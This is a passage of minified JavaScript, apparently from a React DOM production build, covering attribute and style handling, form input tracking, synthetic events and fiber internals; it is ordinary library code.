i=n[Va];if(i)return i;for(var s=n.parentNode;s;){if(i=s[Kn]||s[Va]){if(s=i.alternate,i.child!==null||s!==null&&s.child!==null)for(n=wS(n);n!==null;){if(s=n[Va])return s;n=wS(n)}return i}n=s,s=n.parentNode}return null}function on(n){if(n=n[Va]||n[Kn]){var i=n.tag;if(i===5||i===6||i===13||i===31||i===26||i===27||i===3)return n}return null}function Bt(n){var i=n.tag;if(i===5||i===26||i===27||i===6)return n.stateNode;throw Error(o(33))}function Xn(n){var i=n[Ru];return i||(i=n[Ru]={hoistableStyles:new Map,hoistableScripts:new Map}),i}function Fa(n){n[$n]=!0}var Tl=new Set,xl={};function Zn(n,i){eo(n,i),eo(n+"Capture",i)}function eo(n,i){for(xl[n]=i,n=0;n<i.length;n++)Tl.add(i[n])}var jl=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),Pl={},ql={};function Lu(n){return Fe.call(ql,n)?!0:Fe.call(Pl,n)?!1:jl.test(n)?ql[n]=!0:(Pl[n]=!0,!1)}function os(n,i,s){if(Lu(i))if(s===null)n.removeAttribute(i);else{switch(typeof s){case"undefined":case"function":case"symbol":n.removeAttribute(i);return;case"boolean":var u=i.toLowerCase().slice(0,5);if(u!=="data-"&&u!=="aria-"){n.removeAttribute(i);return}}n.setAttribute(i,""+s)}}function Vt(n,i,s){if(s===null)n.removeAttribute(i);else{switch(typeof s){case"undefined":case"function":case"symbol":case"boolean":n.removeAttribute(i);return}n.setAttribute(i,""+s)}}function Ha(n,i,s,u){if(u===null)n.removeAttribute(s);else{switch(typeof u){case"undefined":case"function":case"symbol":case"boolean":n.removeAttribute(s);return}n.setAttributeNS(i,s,""+u)}}function nt(n){switch(typeof n){case"bigint":case"boolean":case"number":case"string":case"undefined":return n;case"object":return n;default:return""}}function ri(n){var i=n.type;return(n=n.nodeName)&&n.toLowerCase()==="input"&&(i==="checkbox"||i==="radio")}function Rl(n,i,s){var u=Object.getOwnPropertyDescriptor(n.constructor.prototype,i);if(!n.hasOwnProperty(i)&&typeof u<"u"&&typeof u.get=="function"&&typeof u.set=="function"){var h=u.get,b=u.set;return Object.defineProperty(n,i,{configurable:!0,get:function(){return h.call(this)},set:function(C){s=""+C,b.call(this,C)}}),Object.defineProperty(n,i,{enumerable:u.enumerable}),{getValue:function(){return s},setValue:function(C){s=""+C},stopTracking:function(){n._valueTracker=null,delete n[i]}}}}function fa(n){if(!n._valueTracker){var i=ri(n)?"checked":"value";n._valueTracker=Rl(n,i,""+n[i])}}function pr(n){if(!n)return!1;var i=n._valueTracker;if(!i)return!0;var s=i.getValue(),u="";return n&&(u=ri(n)?n.checked?"true":"false":n.value),n=u,n!==s?(i.setValue(n),!0):!1}function ao(n){if(n=n||(typeof document<"u"?document:void 0),typeof n>"u")return null;try{return n.activeElement||n.body}catch{return n.body}}var mr=/[\n"\\]/g;function qt(n){return n.replace(mr,function(i){return"\\"+i.charCodeAt(0).toString(16)+" "})}function is(n,i,s,u,h,b,C,P){n.name="",C!=null&&typeof C!="function"&&typeof C!="symbol"&&typeof C!="boolean"?n.type=C:n.removeAttribute("type"),i!=null?C==="number"?(i===0&&n.value===""||n.value!=i)&&(n.value=""+nt(i)):n.value!==""+nt(i)&&(n.value=""+nt(i)):C!=="submit"&&C!=="reset"||n.removeAttribute("value"),i!=null?Ll(n,C,nt(i)):s!=null?Ll(n,C,nt(s)):u!=null&&n.removeAttribute("value"),h==null&&b!=null&&(n.defaultChecked=!!b),h!=null&&(n.checked=h&&typeof h!="function"&&typeof h!="symbol"),P!=null&&typeof P!="function"&&typeof P!="symbol"&&typeof P!="boolean"?n.name=""+nt(P):n.removeAttribute("name")}function Iu(n,i,s,u,h,b,C,P){if(b!=null&&typeof b!="function"&&typeof b!="symbol"&&typeof b!="boolean"&&(n.type=b),i!=null||s!=null){if(!(b!=="submit"&&b!=="reset"||i!=null)){fa(n);return}s=s!=null?""+nt(s):"",i=i!=null?""+nt(i):s,P||i===n.value||(n.value=i),n.defaultValue=i}u=u??h,u=typeof u!="function"&&typeof u!="symbol"&&!!u,n.checked=P?n.checked:!!u,n.defaultChecked=!!u,C!=null&&typeof C!="function"&&typeof C!="symbol"&&typeof C!="boolean"&&(n.name=C),fa(n)}function Ll(n,i,s){i==="number"&&ao(n.ownerDocument)===n||n.defaultValue===""+s||(n.defaultValue=""+s)}function si(n,i,s,u){if(n=n.options,i){i={};for(var h=0;h<s.length;h++)i["$"+s[h]]=!0;for(s=0;s<n.length;s++)h=i.hasOwnProperty("$"+n[s].value),n[s].selected!==h&&(n[s].selected=h),h&&u&&(n[s].defaultSelected=!0)}else{for(s=""+nt(s),i=null,h=0;h<n.length;h++){if(n[h].value===s){n[h].selected=!0,u&&(n[h].defaultSelected=!0);return}i!==null||n[h].disabled||(i=n[h])}i!==null&&(i.selected=!0)}}function Du(n,i,s){if(i!=null&&(i=""+nt(i),i!==n.value&&(n.value=i),s==null)){n.defaultValue!==i&&(n.defaultValue=i);return}n.defaultValue=s!=null?""+nt(s):""}function li(n,i,s,u){if(i==null){if(u!=null){if(s!=null)throw Error(o(92));if(me(u)){if(1<u.length)throw Error(o(93));u=u[0]}s=u}s==null&&(s=""),i=s}s=nt(i),n.defaultValue=s,u=n.textContent,u===s&&u!==""&&u!==null&&(n.value=u),fa(n)}function Rt(n,i){if(i){var s=n.firstChild;if(s&&s===n.lastChild&&s.nodeType===3){s.nodeValue=i;return}}n.textContent=i}var wu=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function Il(n,i,s){var u=i.indexOf("--")===0;s==null||typeof s=="boolean"||s===""?u?n.setProperty(i,""):i==="float"?n.cssFloat="":n[i]="":u?n.setProperty(i,s):typeof s!="number"||s===0||wu.has(i)?i==="float"?n.cssFloat=s:n[i]=(""+s).trim():n[i]=s+"px"}function Dl(n,i,s){if(i!=null&&typeof i!="object")throw Error(o(62));if(n=n.style,s!=null){for(var u in s)!s.hasOwnProperty(u)||i!=null&&i.hasOwnProperty(u)||(u.indexOf("--")===0?n.setProperty(u,""):u==="float"?n.cssFloat="":n[u]="");for(var h in i)u=i[h],i.hasOwnProperty(h)&&s[h]!==u&&Il(n,h,u)}else for(var b in i)i.hasOwnProperty(b)&&Il(n,b,i[b])}function rs(n){if(n.indexOf("-")===-1)return!1;switch(n){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Mu=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),ci=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function ss(n){return ci.test(""+n)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":n}function xn(){}var wl=null;function rn(n){return n=n.target||n.srcElement||window,n.correspondingUseElement&&(n=n.correspondingUseElement),n.nodeType===3?n.parentNode:n}var ui=null,to=null;function fr(n){var i=on(n);if(i&&(n=i.stateNode)){var s=n[tt]||null;e:switch(n=i.stateNode,i.type){case"input":if(is(n,s.value,s.defaultValue,s.defaultValue,s.checked,s.defaultChecked,s.type,s.name),i=s.name,s.type==="radio"&&i!=null){for(s=n;s.parentNode;)s=s.parentNode;for(s=s.querySelectorAll('input[name="'+qt(""+i)+'"][type="radio"]'),i=0;i<s.length;i++){var u=s[i];if(u!==n&&u.form===n.form){var h=u[tt]||null;if(!h)throw Error(o(90));is(u,h.value,h.defaultValue,h.defaultValue,h.checked,h.defaultChecked,h.type,h.name)}}for(i=0;i<s.length;i++)u=s[i],u.form===n.form&&pr(u)}break e;case"textarea":Du(n,s.value,s.defaultValue);break e;case"select":i=s.value,i!=null&&si(n,!!s.multiple,i,!1)}}}var ls=!1;function di(n,i,s){if(ls)return n(i,s);ls=!0;try{var u=n(i);return u}finally{if(ls=!1,(ui!==null||to!==null)&&(Pd(),ui&&(i=ui,n=to,to=ui=null,fr(i),n)))for(i=0;i<n.length;i++)fr(n[i])}}function jn(n,i){var s=n.stateNode;if(s===null)return null;var u=s[tt]||null;if(u===null)return null;s=u[i];e:switch(i){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(u=!u.disabled)||(n=n.type,u=!(n==="button"||n==="input"||n==="select"||n==="textarea")),n=!u;break e;default:n=!1}if(n)return null;if(s&&typeof s!="function")throw Error(o(231,i,typeof s));return s}var sn=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),hr=!1;if(sn)try{var ba={};Object.defineProperty(ba,"passive",{get:function(){hr=!0}}),window.addEventListener("test",ba,ba),window.removeEventListener("test",ba,ba)}catch{hr=!1}var no=null,Ml=null,gr=null;function _l(){if(gr)return gr;var n,i=Ml,s=i.length,u,h="value"in no?no.value:no.textContent,b=h.length;for(n=0;n<s&&i[n]===h[n];n++);var C=s-n;for(u=1;u<=C&&i[s-u]===h[b-u];u++);return gr=h.slice(n,1<u?1-u:void 0)}function br(n){var i=n.keyCode;return"charCode"in n?(n=n.charCode,n===0&&i===13&&(n=13)):n=i,n===10&&(n=13),32<=n||n===13?n:0}function xo(){return!0}function Pn(){return!1}function rt(n){function i(s,u,h,b,C){this._reactName=s,this._targetInst=h,this.type=u,this.nativeEvent=b,this.target=C,this.currentTarget=null;for(var P in n)n.hasOwnProperty(P)&&(s=n[P],this[P]=s?s(b):b[P]);return this.isDefaultPrevented=(b.defaultPrevented!=null?b.defaultPrevented:b.returnValue===!1)?xo:Pn,this.isPropagationStopped=Pn,this}return y(i.prototype,{preventDefault:function(){this.defaultPrevented=!0;var s=this.nativeEvent;s&&(s.preventDefault?s.preventDefault():typeof s.returnValue!="unknown"&&(s.returnValue=!1),this.isDefaultPrevented=xo)},stopPropagation:function(){var s=this.nativeEvent;s&&(s.stopPropagation?s.stopPropagation():typeof s.cancelBubble!="unknown"&&(s.cancelBubble=!0),this.isPropagationStopped=xo)},persist:function(){},isPersistent:xo}),i}var jo={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(n){return n.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},oo=rt(jo),pi=y({},jo,{view:0,detail:0}),kl=rt(pi),mi,cs,io,us=y({},pi,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:fi,button:0,buttons:0,relatedTarget:function(n){return n.relatedTarget===void 0?n.fromElement===n.srcElement?n.toElement:n.fromElement:n.relatedTarget},movementX:function(n){return"movementX"in n?n.movementX:(n!==io&&(io&&n.type==="mousemove"?(mi=n.screenX-io.screenX,cs=n.screenY-io.screenY):cs=mi=0,io=n),mi)},movementY:function(n){return"movementY"in n?n.movementY:cs}}),Nl=rt(us),vr=y({},us,{dataTransfer:0}),_u=rt(vr),ku=y({},pi,{relatedTarget:0}),yr=rt(ku),Ol=y({},jo,{animationName:0,elapsedTime:0,pseudoElement:0}),Nu=rt(Ol),ds=y({},jo,{clipboardData:function(n){return"clipboardData"in n?n.clipboardData:window.clipboardData}}),Ou=rt(ds),zu=y({},jo,{data:0}),ro=rt(zu),Uu={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Bu={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Vu={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Fu(n){var i=this.nativeEvent;return i.getModifierState?i.getModifierState(n):(n=Vu[n])?!!i[n]:!1}function fi(){return Fu}var Tt=y({},pi,{key:function(n){if(n.key){var i=Uu[n.key]||n.key;if(i!=="Unidentified")return i}return n.type==="keypress"?(n=br(n),n===13?"Enter":String.fromCharCode(n)):n.type==="keydown"||n.type==="keyup"?Bu[n.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:fi,charCode:function(n){return n.type==="keypress"?br(n):0},keyCode:function(n){return n.type==="keydown"||n.type==="keyup"?n.keyCode:0},which:function(n){return n.type==="keypress"?br(n):n.type==="keydown"||n.type==="keyup"?n.keyCode:0}}),Hu=rt(Tt),Gu=y({},us,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Po=rt(Gu),m=y({},pi,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:fi}),E=rt(m),T=y({},jo,{propertyName:0,elapsedTime:0,pseudoElement:0}),q=rt(T),$=y({},us,{deltaX:function(n){return"deltaX"in n?n.deltaX:"wheelDeltaX"in n?-n.wheelDeltaX:0},deltaY:function(n){return"deltaY"in n?n.deltaY:"wheelDeltaY"in n?-n.wheelDeltaY:"wheelDelta"in n?-n.wheelDelta:0},deltaZ:0,deltaMode:0}),te=rt($),be=y({},jo,{newState:0,oldState:0}),ze=rt(be),ka=[9,13,27,32],ua=sn&&"CompositionEvent"in window,Ra=null;sn&&"documentMode"in document&&(Ra=document.documentMode);var ln=sn&&"TextEvent"in window&&!Ra,so=sn&&(!ua||Ra&&8<Ra&&11>=Ra),qn=" ",Rn=!1;function Er(n,i){switch(n){case"keyup":return ka.indexOf(i.keyCode)!==-1;case"keydown":return i.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function ps(n){return n=n.detail,typeof n=="object"&&"data"in n?n.data:null}var ms=!1;function mP(n,i){switch(n){case"compositionend":return ps(i);case"keypress":return i.which!==32?null:(Rn=!0,qn);case"textInput":return n=i.data,n===qn&&Rn?null:n;default:return null}}function fP(n,i){if(ms)return n==="compositionend"||!ua&&Er(n,i)?(n=_l(),gr=Ml=no=null,ms=!1,n):null;switch(n){case"paste":return null;case"keypress":if(!(i.ctrlKey||i.altKey||i.metaKey)||i.ctrlKey&&i.altKey){if(i.char&&1<i.char.length)return i.char;if(i.which)return String.fromCharCode(i.which)}return null;case"compositionend":return so&&i.locale!=="ko"?null:i.data;default:return null}}var hP={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function kv(n){var i=n&&n.nodeName&&n.nodeName.toLowerCase();return i==="input"?!!hP[n.type]:i==="textarea"}function Nv(n,i,s,u){ui?to?to.push(u):to=[u]:ui=u,i=Md(i,"onChange"),0<i.length&&(s=new oo("onChange","change",null,s,u),n.push({event:s,listeners:i}))}var zl=null,Ul=null;function gP(n){yS(n,0)}function Ju(n){var i=Bt(n);if(pr(i))return n}function Ov(n,i){if(n==="change")return i}var zv=!1;if(sn){var Pm;if(sn){var qm="oninput"in document;if(!qm){var Uv=document.createElement("div");Uv.setAttribute("oninput","return;"),qm=typeof Uv.oninput=="function"}Pm=qm}else Pm=!1;zv=Pm&&(!document.documentMode||9<document.documentMode)}function Bv(){zl&&(zl.detachEvent("onpropertychange",Vv),Ul=zl=null)}function Vv(n){if(n.propertyName==="value"&&Ju(Ul)){var i=[];Nv(i,Ul,n,rn(n)),di(gP,i)}}function bP(n,i,s){n==="focusin"?(Bv(),zl=i,Ul=s,zl.attachEvent("onpropertychange",Vv)):n==="focusout"&&Bv()}function vP(n){if(n==="selectionchange"||n==="keyup"||n==="keydown")return Ju(Ul)}function yP(n,i){if(n==="click")return Ju(i)}function EP(n,i){if(n==="input"||n==="change")return Ju(i)}function SP(n,i){return n===i&&(n!==0||1/n===1/i)||n!==n&&i!==i}var Ft=typeof Object.is=="function"?Object.is:SP;function Bl(n,i){if(Ft(n,i))return!0;if(typeof n!="object"||n===null||typeof i!="object"||i===null)return!1;var s=Object.keys(n),u=Object.keys(i);if(s.length!==u.length)return!1;for(u=0;u<s.length;u++){var h=s[u];if(!Fe.call(i,h)||!Ft(n[h],i[h]))return!1}return!0}function Fv(n){for(;n&&n.firstChild;)n=n.firstChild;return n}function Hv(n,i){var s=Fv(n);n=0;for(var u;s;){if(s.nodeType===3){if(u=n+s.textContent.length,n<=i&&u>=i)return{node:s,offset:i-n};n=u}e:{for(;s;){if(s.nextSibling){s=s.nextSibling;break e}s=s.parentNode}s=void 0}s=Fv(s)}}function Gv(n,i){return n&&i?n===i?!0:n&&n.nodeType===3?!1:i&&i.nodeType===3?Gv(n,i.parentNode):"contains"in n?n.contains(i):n.compareDocumentPosition?!!(n.compareDocumentPosition(i)&16):!1:!1}function Jv(n){n=n!=null&&n.ownerDocument!=null&&n.ownerDocument.defaultView!=null?n.ownerDocument.defaultView:window;for(var i=ao(n.document);i instanceof n.HTMLIFrameElement;){try{var s=typeof i.contentWindow.location.href=="string"}catch{s=!1}if(s)n=i.contentWindow;else break;i=ao(n.document)}return i}function Rm(n){var i=n&&n.nodeName&&n.nodeName.toLowerCase();return i&&(i==="input"&&(n.type==="text"||n.type==="search"||n.type==="tel"||n.type==="url"||n.type==="password")||i==="textarea"||n.contentEditable==="true")}var CP=sn&&"documentMode"in document&&11>=document.documentMode,fs=null,Lm=null,Vl=null,Im=!1;function Qv(n,i,s){var u=s.window===s?s.document:s.nodeType===9?s:s.ownerDocument;Im||fs==null||fs!==ao(u)||(u=fs,"selectionStart"in u&&Rm(u)?u={start:u.selectionStart,end:u.selectionEnd}:(u=(u.ownerDocument&&u.ownerDocument.defaultView||window).getSelection(),u={anchorNode:u.anchorNode,anchorOffset:u.anchorOffset,focusNode:u.focusNode,focusOffset:u.focusOffset}),Vl&&Bl(Vl,u)||(Vl=u,u=Md(Lm,"onSelect"),0<u.length&&(i=new oo("onSelect","select",null,i,s),n.push({event:i,listeners:u}),i.target=fs)))}function Sr(n,i){var s={};return s[n.toLowerCase()]=i.toLowerCase(),s["Webkit"+n]="webkit"+i,s["Moz"+n]="moz"+i,s}var hs={animationend:Sr("Animation","AnimationEnd"),animationiteration:Sr("Animation","AnimationIteration"),animationstart:Sr("Animation","AnimationStart"),transitionrun:Sr("Transition","TransitionRun"),transitionstart:Sr("Transition","TransitionStart"),transitioncancel:Sr("Transition","TransitionCancel"),transitionend:Sr("Transition","TransitionEnd")},Dm={},Wv={};sn&&(Wv=document.createElement("div").style,"AnimationEvent"in window||(delete hs.animationend.animation,delete hs.animationiteration.animation,delete hs.animationstart.animation),"TransitionEvent"in window||delete hs.transitionend.transition);function Cr(n){if(Dm[n])return Dm[n];if(!hs[n])return n;var i=hs[n],s;for(s in i)if(i.hasOwnProperty(s)&&s in Wv)return Dm[n]=i[s];return n}var Kv=Cr("animationend"),$v=Cr("animationiteration"),Yv=Cr("animationstart"),AP=Cr("transitionrun"),TP=Cr("transitionstart"),xP=Cr("transitioncancel"),Xv=Cr("transitionend"),Zv=new Map,wm="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");wm.push("scrollEnd");function Ln(n,i){Zv.set(n,i),Zn(i,[n])}var Qu=typeof reportError=="function"?reportError:function(n){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var i=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof n=="object"&&n!==null&&typeof n.message=="string"?String(n.message):String(n),error:n});if(!window.dispatchEvent(i))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",n);return}console.error(n)},cn=[],gs=0,Mm=0;function Wu(){for(var n=gs,i=Mm=gs=0;i<n;){var s=cn[i];cn[i++]=null;var u=cn[i];cn[i++]=null;var h=cn[i];cn[i++]=null;var b=cn[i];if(cn[i++]=null,u!==null&&h!==null){var C=u.pending;C===null?h.next=h:(h.next=C.next,C.next=h),u.pending=h}b!==0&&ey(s,h,b)}}function Ku(n,i,s,u){cn[gs++]=n,cn[gs++]=i,cn[gs++]=s,cn[gs++]=u,Mm|=u,n.lanes|=u,n=n.alternate,n!==null&&(n.lanes|=u)}function _m(n,i,s,u){return Ku(n,i,s,u),$u(n)}function Ar(n,i){return Ku(n,null,null,i),$u(n)}function ey(n,i,s){n.lanes|=s;var u=n.alternate;u!==null&&(u.lanes|=s);for(var h=!1,b=n.return;b!==null;)b.childLanes|=s,u=b.alternate,u!==null&&(u.childLanes|=s),b.tag===22&&(n=b.stateNode,n===null||n._visibility&1||(h=!0)),n=b,b=b.return;return n.tag===3?(b=n.stateNode,h&&i!==null&&(h=31-He(s),n=b.hiddenUpdates,u=n[h],u===null?n[h]=[i]:u.push(i),i.lane=s|536870912),b):null}function $u(n){if(50<uc)throw uc=0,Gf=null,Error(o(185));for(var i=n.return;i!==null;)n=i,i=n.return;return n.tag===3?n.stateNode:null}var bs={};function jP(n,i,s,u){this.tag=n,this.key=s,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=i,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=u,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Ht(n,i,s,u){return new jP(n,i,s,u)}function km(n){return n=n.prototype,!(!n||!n.isReactComponent)}function qo(n,i){var s=n.alternate;return s===null?(s=Ht(n.tag,i,n.key,n.mode),s.elementType=n.elementType,s.type=n.type,s.stateNode=n.stateNode,s.alternate=n,n.alternate=s):(s.pendingProps=i,s.type=n.type,s.flags=0,s.subtreeFlags=0,s.deletions=null),s.flags=n.flags&65011712,s.childLanes=n.childLanes,s.lanes=n.lanes,s.child=n.child,s.memoizedProps=n.memoizedProps,s.memoizedState=n.memoizedState,s.updateQueue=n.updateQueue,i=n.dependencies,s.dependencies=i===null?null:{lanes:i.lanes,firstContext:i.firstContext},s.sibling=n.sibling,s.index=n.index,s.ref=n.ref,s.refCleanup=n.refCleanup,s}function ay(n,i){n.flags&=65011714;var s=n.alternate;return s===null?(n.childLanes=0,n.lanes=i,n.child=null,n.subtreeFlags=0,n.memoizedProps=null,n.memoizedState=null,n.updateQueue=null,n.dependencies=null,n.stateNode=null):(n.childLanes=s.childLanes,n.lanes=s.lanes,n.child=s.child,n.subtreeFlags=0,n.deletions=null,n.memoizedProps=s.memoizedProps,n.memoizedState=s.memoizedState,n.updateQueue=s.updateQueue,n.type=s.type,i=s.dependencies,n.dependencies=i===null?null:{lanes:i.lanes,firstContext:i.firstContext}),n}function Yu(n,i,s,u,h,b){var C=0;if(u=n,typeof n=="function")km(n)&&(C=1);else if(typeof n=="string")C=Iq(n,s,ve.current)?26:n==="html"||n==="head"||n==="body"?27:5;else e:switch(n){case k:return n=Ht(31,s,i,h),n.elementType=k,n.lanes=b,n;case L:return Tr(s.children,h,b,i);case x:C=8,h|=24;break;case D:return n=Ht(12,s,i,h|2),n.elementType=D,n.lanes=b,n;case ue:return n=Ht(13,s,i,h),n.elementType=ue,n.lanes=b,n;case Q:return n=Ht(19,s,i,h),n.elementType=Q,n.lanes=b,n;default:if(typeof n=="object"&&n!==null)switch(n.$$typeof){case B:C=10;break e;case G:C=9;break e;case ee:C=11;break e;case w:C=14;break e;case I:C=16,u=null;break e}C=29,s=Error(o(130,n===null?"null":typeof n,"")),u=null}return i=Ht(C,s,i,h),i.elementType=n,i.type=u,i.lanes=b,i}function Tr(n,i,s,u){return n=Ht(7,n,u,i),n.lanes=s,n}function Nm(n,i,s){return n=Ht(6,n,null,i),n.lanes=s,n}function ty(n){var i=Ht(18,null,null,0);return i.stateNode=n,i}function Om(n,i,s){return i=Ht(4,n.children!==null?n.children:[],n.key,i),i.lanes=s,i.stateNode={containerInfo:n.containerInfo,pendingChildren:null,implementation:n.implementation},i}var ny=new WeakMap;function un(n,i){if(typeof n=="object"&&n!==null){var s=ny.get(n);return s!==void 0?s:(i={value:n,source:i,stack:Ao(i)},ny.set(n,i),i)}return{value:n,source:i,stack:Ao(i)}}var vs=[],ys=0,Xu=null,Fl=0,dn=[],pn=0,hi=null,lo=1,co="";function Ro(n,i){vs[ys++]=Fl,vs[ys++]=Xu,Xu=n,Fl=i}function oy(n,i,s){dn[pn++]=lo,dn[pn++]=co,dn[pn++]=hi,hi=n;var u=lo;n=co;var h=32-He(u)-1;u&=~(1<<h),s+=1;var b=32-He(i)+h;if(30<b){var C=h-h%5;b=(u&(1<<C)-1).toString(32),u>>=C,h-=C,lo=1<<32-He(i)+h|s<<h|u,co=b+n}else lo=1<<b|s<<h|u,co=n}function zm(n){n.return!==null&&(Ro(n,1),oy(n,1,0))}function Um(n){for(;n===Xu;)Xu=vs[--ys],vs[ys]=null,Fl=vs[--ys],vs[ys]=null;for(;n===hi;)hi=dn[--pn],dn[pn]=null,co=dn[--pn],dn[pn]=null,lo=dn[--pn],dn[pn]=null}function 